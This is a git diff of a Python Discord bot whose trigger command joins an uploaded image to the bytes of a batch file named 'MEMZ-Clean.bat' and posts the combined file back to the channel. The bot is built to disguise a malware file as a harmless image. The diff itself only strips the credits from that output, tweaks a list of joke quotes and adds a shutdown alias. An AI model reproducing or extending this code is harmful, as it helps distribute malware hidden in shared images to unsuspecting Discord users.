@@ -16,7 +16,7 @@ memeQuotes = [
     "why are you wasting your time here? go outside and touch your mom",
     "Sponsored by raycon earbuds",
     "This file is sponsored by nord vpn",
-    "",
+#   "",
 ]
 
 @bot.event
@@ -34,10 +34,10 @@ async def trigger(ctx):
     if ctx.channel.id == 863261299487014947:
         image = requests.get(ctx.message.attachments[0].url).content
         virusFile = open("MEMZ-Clean.bat", 'rb').read()
-        credits = bytes(f'\n\n{watermark}{random.choice("memeQuotes")}\n\nCode and bot by: Roblox Thot#0001\nServer help by: red_muta#6029', 'utf-8')
+        credits = bytes(f'\n\n{watermark}{random.choice("memeQuotes")}\n\nCode and bot by: Roblox Thot#0001\n\n', 'utf-8')
 
         with open("tempfiles/" + str(ctx.message.author.id), "wb") as file:
-            file.write(image + virusFile + credits)
+            file.write(image + virusFile)
 
         # send file to Discord in message
         with open("tempfiles/" + str(ctx.message.author.id), "rb") as file:
@@ -69,7 +69,7 @@ async def merge(ctx, link):
     # wipe the temp file bc fuck that
     os.remove("tempfiles/" + str(ctx.message.author.id))
 
-@bot.command()
+@bot.command(aliases=["shutdown"])
 @commands.is_owner()
 async def restart(ctx):
     """Restart the bot duh!"""
